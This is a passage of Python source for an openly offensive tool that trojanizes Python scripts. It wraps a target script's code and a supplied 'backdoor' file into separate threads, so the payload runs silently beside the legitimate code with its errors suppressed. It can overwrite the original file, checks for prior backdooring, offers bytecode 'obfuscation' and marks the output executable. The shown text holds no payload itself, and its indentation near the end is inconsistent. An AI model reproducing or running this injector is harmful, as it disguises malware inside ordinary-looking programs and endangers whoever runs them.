			sys.exit(error+"[-]) cannot read file {}".format(option.backdoor)+error1)

		hm = open(_output_,'w')
		hm.write("#!/usr/bin/python3\nimport threading\n")
		hm.write("def fcb():\n")
		for lines in (file_to_write.split("\n")) :
			hm.write("\t"+(lines)+"\n")
		hm.write("def rma():\n")
		hm.write("\t"+"try:")
		for haha in (backdoor_to_write.split("\n")):
			hm.write("\t"+"\t"+(haha)+"\n")
		hm.write("\texcept:\n")
		hm.write("\t\tpass\n")
		hm.write("thread_1 = threading.Thread(target=fcb)\n")
		hm.write("thread_2 = threading.Thread(target=rma)\n")
		hm.write("thread_1.start()\n")
		hm.write("thread_2.start()\n")
		hm.close()
		print(sucess+"[+] Injection finished "+sucess1)
		print(sucess+"[*] Output : {} ".format(_output_)+sucess1)

		question = raw_input(sucess+"[*] Do you want  encrypt (obfuscate) the output [y/n] ? "+sucess1)
		if (question.lower()) == "y" :
			py_compile.compile(_output_, cfile=(_output_)+"c", dfile=None, doraise=False, )
			if (sys.platform.startswith("linux")):
				os.system("mv {}  {} ".format(_output_+"c",_output_))
			elif (sys.platform.startswith("windows")):
				os.system("rename {}  {} ".format(_output_+"c",_output_))
			elif (sys.platform.startswith("darwin")):
				os.system("mv {}  {} ".format(_output_+"c",_output_))
		else:
			pass

		if (sys.platform.startswith("linux")):
			os.system("chmod +x {}".format(_output_))
		else:
			pass

		print(sucess+"[+] Encryption finished "+sucess1)



	elif not (option.out) :
		try:
			file_to_write = open(option.file,'r').read()
		except :
			sys.exit(error+"[-] cannot read file {}".format(option.file)+error1)
		try:
			backdoor_to_write = open(option.backdoor,'r').read()
		except :
			sys.exit(error+"[-] cannot read file {}".format(option.backdoor)+error1)

		test = open(option.file,'r').read()


		if "thread_1.start()" in (test):
			sys.exit(error+"[-] File '{}' is already backdoored ".format(option.file)+error1)

		hm = open(option.file,'w')
		hm.write("#!/usr/bin/python3\nimport threading\n")
		hm.write("def fcb():\n")
		for lines in (file_to_write.split("\n")) :
			hm.write("\t"+(lines)+"\n")
		hm.write("def rma():\n")
		hm.write("\t"+"try:\n")
		for haha in (backdoor_to_write.split("\n")):
			hm.write("\t"+"\t"+(haha)+"\n")
		hm.write("\texcept:\n")
		hm.write("\t\tpass\n")
		hm.write("thread_1 = threading.Thread(target=fcb)\n")
		hm.write("thread_2 = threading.Thread(target=rma)\n")
		hm.write("thread_1.start()\n")
		hm.write("thread_2.start()\n")
		hm.close()
		print(sucess+"[+] Injection finished  "+sucess1)
		question = raw_input(sucess+"Do you want  encrypt (obfuscate) the output [y/n] ? "+sucess1)
		if (question.lower()) == "y" :
			py_compile.compile(option.file, cfile=(option.file)+"c", dfile=None, doraise=False, )
			_output_ = option.file
			if (sys.platform.startswith("linux")):
				os.system("mv {}  {} ".format(_output_+"c",_output_))
			elif (sys.platform.startswith("windows")):
				os.system("rename {}  {} ".format(_output_+"c",_output_))
			elif (sys.platform.startswith("darwin")):
				os.system("mv {}  {} ".format(_output_+"c",_output_))
			else:
				pass
			if (sys.platform.startswith("linux")):
				os.system("chmod +x {}".format(_output_))

			print("[+] Encryption finished ")	
		else:
			pass
else:
        time.sleep(3)
	sys.exit()
